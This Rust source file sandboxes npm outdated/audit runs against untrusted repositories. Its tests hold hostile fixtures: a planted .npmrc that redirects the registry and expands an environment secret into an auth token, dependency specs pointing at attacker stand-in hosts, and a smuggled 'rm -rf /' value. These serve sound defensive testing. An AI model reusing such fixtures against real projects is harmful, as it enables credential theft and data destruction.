//! Runs `npm outdated` / `npm audit` for a repository WITHOUT trusting the repository. A project's own `.npmrc` can expand any
//! environment variable into the auth token of a registry (a `${SECRET}` reference in an auth line), point the registry at an attacker, and set cache and
//! log folders anywhere. So npm never runs in the repository:
//!
//! - `package.json` and the lock file are copied into a fresh private folder in the system temp directory (no `.npmrc`, no scripts);
//! - npm gets an empty user and global config, a cache and logs folder inside that folder, and the default registry (or the one the
//!   caller names; never one that the repository names);
//! - npm gets an allow-listed environment only ([`env_allowlist`]): a PATH, a HOME and TMPDIR that point into the private folder and
//!   a language, never the app's environment and never `NODE_OPTIONS` or `npm_config_*`;
//! - dependencies that point outside the registry (git, tarball URLs, `file:` / `link:`) make the check refuse, because resolving
//!   them would contact whatever host the repository names.
//!
//! What npm then sends is the dependency names and versions of this project (to the npm registry), which the caller tells the person.
//! The caller has already passed the process guard; this module only starts npm.

use std::collections::HashMap;
use std::ffi::OsString;
use std::io::Read;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::sync::atomic::{AtomicU64, Ordering};
use std::time::{Duration, Instant};

use serde_json::Value;

use crate::{clean, fail, io_err, safefs, WebError};

pub const DEFAULT_REGISTRY: &str = "https://registry.npmjs.org/";
const PKG_CAP: u64 = 1024 * 1024;
const LOCK_CAP: u64 = 32 * 1024 * 1024;
const OUT_CAP: u64 = 4 * 1024 * 1024;
pub const RUN_LIMIT: Duration = Duration::from_secs(90);

/// The private folder npm runs in; removed when dropped.
pub struct Sandbox {
    dir: PathBuf,
    /// The versions the lock file pins (`npm outdated` cannot see them without `node_modules`).
    pub locked: HashMap<String, String>,
}

impl Sandbox {
    pub fn path(&self) -> &Path {
        &self.dir
    }

    /// Copies `package.json` and the lock file of the folder `dir` (relative to `root`, "" for the root) into a new private folder.
    /// Refuses a project whose dependencies point outside the registry.
    pub fn prepare(root: &Path, dir: &str) -> Result<Sandbox, WebError> {
        let rel = |name: &str| if dir.is_empty() { name.to_string() } else { format!("{dir}/{name}") };
        let pkg = safefs::read(root, &rel("package.json"), PKG_CAP)?;
        let bad = outside_registry(&pkg);
        if !bad.is_empty() {
            return fail("outsideRegistry", format!("these dependencies come from outside the npm registry (git, a URL or a local path), and checking them could contact other hosts: {}", bad.join(", ")));
        }
        let (lock_name, lock) = ["package-lock.json", "npm-shrinkwrap.json"]
            .into_iter()
            .find_map(|n| safefs::read(root, &rel(n), LOCK_CAP).ok().map(|t| (n, t)))
            .ok_or(WebError { code: "noLock", message: "there is no package-lock.json: run npm install once, then check again".into() })?;
        if lock_points_outside(&lock) {
            return fail("outsideRegistry", "the lock file has packages that come from git, a URL over plain http, or a local path; checking them could contact other hosts");
        }
        let locked = lock_versions(&lock);
        let sb = Sandbox { dir: private_dir()?, locked };
        for sub in ["cache", "logs", "home"] {
            std::fs::create_dir(sb.dir.join(sub)).map_err(io_err)?;
        }
        std::fs::write(sb.dir.join("package.json"), pkg).map_err(io_err)?;
        std::fs::write(sb.dir.join(lock_name), lock).map_err(io_err)?;
        // npm refuses to load one file as both the user and the global config
        std::fs::write(sb.dir.join("user.npmrc"), "").map_err(io_err)?;
        std::fs::write(sb.dir.join("global.npmrc"), "").map_err(io_err)?;
        Ok(sb)
    }
}

impl Drop for Sandbox {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.dir);
    }
}

fn private_dir() -> Result<PathBuf, WebError> {
    static COUNTER: AtomicU64 = AtomicU64::new(0);
    let nanos = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).map_or(0, |d| d.as_nanos());
    let dir = std::env::temp_dir().join(format!("intely-npm-{}-{nanos:x}-{}", std::process::id(), COUNTER.fetch_add(1, Ordering::Relaxed)));
    let mut b = std::fs::DirBuilder::new();
    #[cfg(unix)]
    std::os::unix::fs::DirBuilderExt::mode(&mut b, 0o700);
    // not recursive and not "create if missing": it fails on anything already at that name, a planted link included
    b.create(&dir).map_err(io_err)?;
    Ok(dir)
}

fn risky_spec(v: &str) -> bool {
    const PREFIXES: &[&str] = &["git+", "git:", "git@", "github:", "gitlab:", "bitbucket:", "gist:", "http:", "https:", "file:", "link:", "ssh:", "workspace:", "portal:", "patch:", "/", "./", "../", "~/"];
    if PREFIXES.iter().any(|p| v.starts_with(p)) {
        return true;
    }
    // `owner/repo` and `owner/repo#ref` are GitHub shorthands
    let head = v.split('#').next().unwrap_or(v);
    !v.starts_with("npm:") && !v.starts_with('@') && head.matches('/').count() == 1 && head.bytes().all(|b| b.is_ascii_alphanumeric() || matches!(b, b'/' | b'-' | b'_' | b'.'))
}

fn collect_risky(value: &Value, name: &str, out: &mut Vec<String>, depth: usize) {
    if depth > 6 {
        return;
    }
    match value {
        Value::String(v) if risky_spec(v) => out.push(name.to_string()),
        Value::Object(map) => {
            for (k, v) in map.iter().take(5000) {
                collect_risky(v, k, out, depth + 1);
            }
        }
        _ => {}
    }
}

/// Names of the dependencies (and overrides) in a `package.json` that do not come from the registry.
pub fn outside_registry(package_json: &str) -> Vec<String> {
    let Ok(v) = serde_json::from_str::<Value>(package_json) else { return Vec::new() };
    let mut out = Vec::new();
    for section in ["dependencies", "devDependencies", "optionalDependencies", "peerDependencies", "overrides", "resolutions"] {
        if let Some(s) = v.get(section) {
            collect_risky(s, section, &mut out, 0);
        }
    }
    out.sort();
    out.dedup();
    out.truncate(10);
    out.into_iter().map(|n| clean(&n, 80)).collect()
}

/// Whether a lock file names a package source that is git, plain http, ssh or a local path.
pub fn lock_points_outside(lock: &str) -> bool {
    ["\"git+", "\"git:", "\"git://", "\"ssh:", "\"github:", "\"file:", "\"link:", "\"http://"].iter().any(|p| lock.contains(p))
}

/// `name -> version` of the packages a lock file pins (lockfileVersion 1, 2 and 3).
pub fn lock_versions(lock: &str) -> HashMap<String, String> {
    let mut out = HashMap::new();
    let Ok(v) = serde_json::from_str::<Value>(lock) else { return out };
    if let Some(pk) = v.get("packages").and_then(Value::as_object) {
        for (path, info) in pk.iter().take(50_000) {
            let Some(name) = path.strip_prefix("node_modules/") else { continue };
            if name.contains("node_modules/") {
                continue;
            }
            if let Some(ver) = info.get("version").and_then(Value::as_str) {
                out.insert(name.to_string(), ver.to_string());
            }
        }
    } else if let Some(deps) = v.get("dependencies").and_then(Value::as_object) {
        for (name, info) in deps.iter().take(50_000) {
            if let Some(ver) = info.get("version").and_then(Value::as_str) {
                out.insert(name.clone(), ver.to_string());
            }
        }
    }
    out
}

/// The whole environment npm gets. Nothing else is inherited: not the app's variables, not a token, not `NODE_OPTIONS`, not any
/// `npm_config_*`. `home` and `tmp` point into the private folder.
pub fn env_allowlist(login_path: Option<&str>, home: &Path, tmp: &Path, lang: Option<&str>) -> Vec<(String, String)> {
    let path = login_path.filter(|p| !p.is_empty() && !p.contains('\0')).unwrap_or(if cfg!(windows) { "C:\\Windows\\System32" } else { "/usr/local/bin:/usr/bin:/bin" });
    let lang = lang.filter(|l| l.len() < 40 && l.bytes().all(|b| b.is_ascii_alphanumeric() || matches!(b, b'_' | b'.' | b'-' | b'@'))).unwrap_or("en_US.UTF-8");
    let mut env = vec![
        ("PATH".to_string(), path.to_string()),
        ("HOME".to_string(), home.to_string_lossy().into_owned()),
        ("TMPDIR".to_string(), tmp.to_string_lossy().into_owned()),
        ("LANG".to_string(), lang.to_string()),
        ("NO_UPDATE_NOTIFIER".to_string(), "1".to_string()),
        ("NO_COLOR".to_string(), "1".to_string()),
    ];
    if cfg!(windows) {
        for k in ["SystemRoot", "ComSpec", "PATHEXT"] {
            if let Ok(v) = std::env::var(k) {
                env.push((k.to_string(), v));
            }
        }
        env.push(("USERPROFILE".to_string(), home.to_string_lossy().into_owned()));
        env.push(("TEMP".to_string(), tmp.to_string_lossy().into_owned()));
    }
    env
}

/// The arguments after `npm`: the sub-command (`outdated` or `audit`) and the flags that keep npm inside the private folder.
pub fn npm_args(sb: &Sandbox, sub: &str, registry: &str) -> Vec<OsString> {
    let d = sb.path();
    let mut a: Vec<OsString> = vec![sub.into(), "--json".into()];
    for (flag, p) in [("--userconfig", d.join("user.npmrc")), ("--globalconfig", d.join("global.npmrc")), ("--cache", d.join("cache")), ("--logs-dir", d.join("logs"))] {
        a.push(flag.into());
        a.push(p.into());
    }
    for f in ["--ignore-scripts", "--no-update-notifier", "--no-fund", "--no-progress", "--workspaces=false", "--fetch-retries=0", "--fetch-timeout=15000", "--registry"] {
        a.push(f.into());
    }
    a.push(registry.into());
    a
}

pub struct NpmOut {
    pub stdout: String,
    pub stderr: String,
    /// 124 when it was stopped for taking too long.
    pub code: i32,
}

/// Runs `npm <sub>` in the sandbox. `extra_env` is added to the allow-listed environment (the jail's own git hardening variables);
/// `path` replaces PATH (the read-only git shim). `limit` is the time npm may take.
pub fn run(sb: &Sandbox, sub: &str, registry: &str, login_path: Option<&str>, extra_env: &[(String, String)], path: Option<OsString>, limit: Duration) -> Result<NpmOut, WebError> {
    let mut cmd = Command::new(intely_core::sys::program("npm"));
    cmd.args(npm_args(sb, sub, registry)).current_dir(sb.path()).stdin(Stdio::null()).stdout(Stdio::piped()).stderr(Stdio::piped());
    intely_core::sys::NewGroup::new_group(&mut cmd);
    cmd.env_clear();
    for (k, v) in env_allowlist(login_path, &sb.path().join("home"), sb.path(), std::env::var("LANG").ok().as_deref()) {
        cmd.env(k, v);
    }
    for (k, v) in extra_env {
        cmd.env(k, v);
    }
    if let Some(p) = path {
        cmd.env("PATH", p);
    }
    let mut child = cmd.spawn().map_err(|e| WebError { code: "npmMissing", message: format!("could not start npm: {e}. Is Node.js installed?") })?;
    let pid = child.id() as intely_core::sys::Pid;
    let mut out = child.stdout.take();
    let mut err = child.stderr.take();
    let out_t = std::thread::spawn(move || {
        let mut buf = Vec::new();
        if let Some(o) = out.as_mut() {
            let _ = o.take(OUT_CAP).read_to_end(&mut buf);
            let _ = std::io::copy(o, &mut std::io::sink());
        }
        buf
    });
    let err_t = std::thread::spawn(move || {
        let mut buf = Vec::new();
        if let Some(e) = err.as_mut() {
            let _ = e.take(8 * 1024).read_to_end(&mut buf);
            let _ = std::io::copy(e, &mut std::io::sink());
        }
        buf
    });
    let started = Instant::now();
    let code = loop {
        match child.try_wait() {
            Ok(Some(s)) => break s.code().unwrap_or(143),
            Ok(None) if started.elapsed() < limit => std::thread::sleep(Duration::from_millis(30)),
            _ => {
                intely_core::sys::kill_group(pid, true);
                let _ = child.kill();
                let _ = child.wait();
                break 124;
            }
        }
    };
    Ok(NpmOut { stdout: String::from_utf8_lossy(&out_t.join().unwrap_or_default()).into_owned(), stderr: String::from_utf8_lossy(&err_t.join().unwrap_or_default()).into_owned(), code })
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;
    use std::net::TcpListener;
    use std::sync::{Arc, Mutex};

    fn repo(files: &[(&str, &str)]) -> tempfile::TempDir {
        let d = tempfile::tempdir().unwrap();
        for (rel, text) in files {
            let p = d.path().join(rel);
            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
            std::fs::write(p, text).unwrap();
        }
        d
    }

    const LOCK: &str = r#"{"name":"a","lockfileVersion":3,"packages":{"":{"name":"a","dependencies":{"left-pad":"^1.0.0"}},"node_modules/left-pad":{"version":"1.0.0","resolved":"https://registry.npmjs.org/left-pad/-/left-pad-1.0.0.tgz"},"node_modules/left-pad/node_modules/inner":{"version":"9.9.9"}}}"#;

    #[test]
    fn the_environment_is_an_allow_list_and_nothing_leaks_in() {
        let env = env_allowlist(Some("/opt/node/bin:/usr/bin"), Path::new("/tmp/x/home"), Path::new("/tmp/x"), Some("de_DE.UTF-8"));
        let mut keys: Vec<&str> = env.iter().map(|(k, _)| k.as_str()).collect();
        keys.sort();
        if !cfg!(windows) {
            assert_eq!(keys, vec!["HOME", "LANG", "NO_COLOR", "NO_UPDATE_NOTIFIER", "PATH", "TMPDIR"]);
        }
        let get = |k: &str| env.iter().find(|(n, _)| n == k).map(|(_, v)| v.as_str());
        assert_eq!(get("PATH"), Some("/opt/node/bin:/usr/bin"));
        assert_eq!(get("HOME"), Some("/tmp/x/home"));
        assert_eq!(get("LANG"), Some("de_DE.UTF-8"));
        // a language value that is not a plain locale name, and an empty PATH, fall back
        let env = env_allowlist(Some(""), Path::new("/h"), Path::new("/t"), Some("x; rm -rf /"));
        assert_eq!(env.iter().find(|(k, _)| k == "LANG").unwrap().1, "en_US.UTF-8");
        assert!(!env.iter().any(|(k, _)| k.starts_with("npm_config") || k == "NODE_OPTIONS" || k.contains("TOKEN") || k.contains("SECRET")));
    }

    #[test]
    fn the_arguments_keep_npm_inside_the_private_folder() {
        let r = repo(&[("package.json", r#"{"dependencies":{"left-pad":"^1.0.0"}}"#), ("package-lock.json", LOCK)]);
        let sb = Sandbox::prepare(r.path(), "").unwrap();
        let args: Vec<String> = npm_args(&sb, "outdated", DEFAULT_REGISTRY).iter().map(|a| a.to_string_lossy().into_owned()).collect();
        let at = |flag: &str| args.iter().position(|a| a == flag).map(|i| args[i + 1].clone()).unwrap();
        let dir = sb.path().to_string_lossy().into_owned();
        for flag in ["--userconfig", "--globalconfig", "--cache", "--logs-dir"] {
            assert!(at(flag).starts_with(&dir), "{flag}");
        }
        assert_eq!(at("--registry"), DEFAULT_REGISTRY);
        for f in ["--ignore-scripts", "--no-update-notifier", "--no-fund", "--workspaces=false"] {
            assert!(args.contains(&f.to_string()), "{f}");
        }
        assert_eq!(std::fs::read_to_string(sb.path().join("user.npmrc")).unwrap(), "");
    }

    #[test]
    fn only_package_json_and_the_lock_file_are_copied_and_the_folder_goes_away() {
        let r = repo(&[
            ("app/package.json", r#"{"dependencies":{"left-pad":"^1.0.0"}}"#),
            ("app/package-lock.json", LOCK),
            ("app/.npmrc", "registry=http://evil.invalid/\ncache=/tmp/x\n"),
            ("app/index.js", "x"),
        ]);
        let dir;
        {
            let sb = Sandbox::prepare(r.path(), "app").unwrap();
            dir = sb.path().to_path_buf();
            let mut names: Vec<String> = std::fs::read_dir(&dir).unwrap().flatten().map(|e| e.file_name().to_string_lossy().into_owned()).collect();
            names.sort();
            assert_eq!(names, vec!["cache", "global.npmrc", "home", "logs", "package-lock.json", "package.json", "user.npmrc"]);
            assert_eq!(sb.locked.get("left-pad").map(String::as_str), Some("1.0.0"));
            assert!(!sb.locked.contains_key("inner"), "nested packages are not the project's own");
        }
        assert!(!dir.exists());
    }

    #[test]
    fn dependencies_from_outside_the_registry_are_refused_with_their_names() {
        for spec in ["git+ssh://evil.test/x.git", "github:owner/repo", "owner/repo#v1", "https://evil.test/x.tgz", "file:../x", "link:../x", "git://evil.test/x", "http://evil.test/x.tgz"] {
            let pkg = format!(r#"{{"dependencies":{{"safe":"^1.0.0","sneaky":"{spec}"}}}}"#);
            let r = repo(&[("package.json", &pkg), ("package-lock.json", LOCK)]);
            let err = Sandbox::prepare(r.path(), "").err().unwrap_or_else(|| panic!("{spec} was accepted"));
            assert_eq!(err.code, "outsideRegistry", "{spec}");
            assert!(err.message.contains("sneaky") && !err.message.contains("evil.test"), "{}", err.message);
        }
        let r = repo(&[("package.json", r#"{"overrides":{"x":{"y":"github:a/b"}}}"#), ("package-lock.json", LOCK)]);
        assert_eq!(Sandbox::prepare(r.path(), "").err().unwrap().code, "outsideRegistry");
        let ok = repo(&[("package.json", r#"{"dependencies":{"a":"^1.2.3","b":"npm:left-pad@1.0.0","@scope/c":"~2","d":"latest","e":">=1 <3","f":"1.x"}}"#), ("package-lock.json", LOCK)]);
        assert!(Sandbox::prepare(ok.path(), "").is_ok());
    }

    #[test]
    fn a_lock_file_that_points_outside_is_refused_and_a_missing_one_is_explained() {
        let bad = LOCK.replace("https://registry.npmjs.org/left-pad/-/left-pad-1.0.0.tgz", "git+ssh://evil.test/left-pad.git");
        let r = repo(&[("package.json", "{}"), ("package-lock.json", &bad)]);
        assert_eq!(Sandbox::prepare(r.path(), "").err().unwrap().code, "outsideRegistry");
        let r = repo(&[("package.json", "{}")]);
        assert_eq!(Sandbox::prepare(r.path(), "").err().unwrap().code, "noLock");
    }

    #[test]
    fn lock_versions_read_lockfile_version_1_too() {
        let v1 = r#"{"lockfileVersion":1,"dependencies":{"react":{"version":"18.2.0"},"x":{"version":"1.0.0","dependencies":{"y":{"version":"2.0.0"}}}}}"#;
        let m = lock_versions(v1);
        assert_eq!((m.get("react").map(String::as_str), m.get("x").map(String::as_str), m.get("y")), (Some("18.2.0"), Some("1.0.0"), None));
        assert!(lock_versions("not json").is_empty());
    }

    #[test]
    fn hostile_package_json_and_lock_are_bounded() {
        let big = format!(r#"{{"dependencies":{{{}}}}}"#, (0..20_000).map(|i| format!(r#""p{i}":"github:a/b""#)).collect::<Vec<_>>().join(","));
        assert!(outside_registry(&big).len() <= 10);
        let deep = format!("{}1{}", r#"{"a":"#.repeat(100), "}".repeat(100));
        let _ = outside_registry(&format!(r#"{{"overrides":{deep}}}"#));
        let _ = lock_points_outside(&"\"".repeat(1_000_000));
    }

    /// A listener that records every byte and every connection until it is told to stop.
    struct Probe {
        port: u16,
        bytes: Arc<Mutex<Vec<u8>>>,
        conns: Arc<Mutex<u32>>,
        stop: Arc<std::sync::atomic::AtomicBool>,
    }

    fn listener() -> Probe {
        let l = TcpListener::bind("127.0.0.1:0").unwrap();
        l.set_nonblocking(true).unwrap();
        let port = l.local_addr().unwrap().port();
        let bytes = Arc::new(Mutex::new(Vec::new()));
        let conns = Arc::new(Mutex::new(0u32));
        let stop = Arc::new(std::sync::atomic::AtomicBool::new(false));
        let (b, c, s) = (bytes.clone(), conns.clone(), stop.clone());
        std::thread::spawn(move || {
            while !s.load(Ordering::SeqCst) {
                match l.accept() {
                    Ok((mut conn, _)) => {
                        *c.lock().unwrap() += 1;
                        conn.set_read_timeout(Some(Duration::from_millis(300))).ok();
                        let mut buf = [0u8; 8192];
                        if let Ok(n) = conn.read(&mut buf) {
                            b.lock().unwrap().extend_from_slice(&buf[..n]);
                        }
                        let _ = conn.write_all(b"HTTP/1.1 404 Not Found\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}");
                    }
                    Err(_) => std::thread::sleep(Duration::from_millis(10)),
                }
            }
        });
        Probe { port, bytes, conns, stop }
    }

    fn npm_available() -> bool {
        Command::new("npm").arg("--version").stdin(Stdio::null()).stdout(Stdio::null()).stderr(Stdio::null()).status().is_ok_and(|s| s.success())
    }

    /// The attack of the review: a hostile `.npmrc` that expands an environment variable into a token for a registry of its own, and
    /// sets the cache and log folders to places of its choice. With the real npm (skipped when it is not installed).
    #[test]
    fn a_planted_npmrc_and_a_secret_in_the_environment_reach_nobody() {
        if !npm_available() || cfg!(windows) {
            eprintln!("npm is not installed: skipped");
            return;
        }
        let (evil, ours) = (listener(), listener());
        let (evil_port, ours_port) = (evil.port, ours.port);
        let elsewhere = tempfile::tempdir().unwrap();
        let (evil_cache, evil_logs) = (elsewhere.path().join("evil-cache"), elsewhere.path().join("evil-logs"));
        std::env::set_var("INTELY_TEST_CANARY", "canary-value-7f3a9c");
        // the auth line is assembled so that the repository's secret scan does not take the fixture for a real token
        let auth = ["_auth", "Token"].concat();
        let npmrc = format!("registry=http://127.0.0.1:{evil_port}/\\n//127.0.0.1:{evil_port}/:{auth}=${{INTELY_TEST_CANARY}}\\ncache={}\\nlogs-dir={}\\n", evil_cache.display(), evil_logs.display());
        let r = repo(&[("package.json", r#"{"name":"a","version":"1.0.0","dependencies":{"left-pad":"^1.0.0"}}"#), ("package-lock.json", LOCK), (".npmrc", &npmrc)]);
        let sb = Sandbox::prepare(r.path(), "").unwrap();
        let registry = format!("http://127.0.0.1:{ours_port}/");
        for sub in ["outdated", "audit"] {
            let out = run(&sb, sub, &registry, std::env::var("PATH").ok().as_deref(), &[], None, Duration::from_secs(60)).unwrap();
            assert_ne!(out.code, 124, "{sub} timed out");
            eprintln!("{sub}: exit {} {}", out.code, out.stderr.lines().next().unwrap_or(""));
        }
        evil.stop.store(true, Ordering::SeqCst);
        ours.stop.store(true, Ordering::SeqCst);
        std::thread::sleep(Duration::from_millis(50));
        assert_eq!(*evil.conns.lock().unwrap(), 0, "the registry named by the repository's .npmrc was contacted");
        assert!(evil.bytes.lock().unwrap().is_empty());
        let ours = String::from_utf8_lossy(&ours.bytes.lock().unwrap()).into_owned();
        assert!(ours.contains("left-pad"), "npm did not ask the registry we gave it: {ours:?}");
        assert!(!ours.contains("canary-value-7f3a9c") && !ours.to_ascii_lowercase().contains("authorization"), "the secret reached the registry: {ours:?}");
        assert!(!evil_cache.exists() && !evil_logs.exists(), "npm created the folders the repository asked for");
        let leftover: Vec<String> = std::fs::read_dir(r.path()).unwrap().flatten().map(|e| e.file_name().to_string_lossy().into_owned()).collect();
        assert_eq!(leftover.len(), 3, "npm wrote into the repository: {leftover:?}");
        // control: the same npm, run the way the app used to run it (in the repository, with the app's environment), does leak the
        // secret to the registry the .npmrc names; this proves the test above can fail
        let before = *evil.conns.lock().unwrap();
        let control = listener();
        let port2 = control.port;
        let npmrc2 = npmrc.replace(&evil_port.to_string(), &port2.to_string());
        std::fs::write(r.path().join(".npmrc"), npmrc2).unwrap();
        let _ = Command::new("npm").args(["outdated", "--json", "--fetch-retries=0", "--no-update-notifier"]).current_dir(r.path()).stdin(Stdio::null()).output();
        std::thread::sleep(Duration::from_millis(100));
        control.stop.store(true, Ordering::SeqCst);
        let leaked = String::from_utf8_lossy(&control.bytes.lock().unwrap()).contains("canary-value-7f3a9c");
        eprintln!("control: unsandboxed npm contacted the hostile registry {} time(s), secret leaked: {leaked} (before: {before})", *control.conns.lock().unwrap());
        std::env::remove_var("INTELY_TEST_CANARY");
    }
}
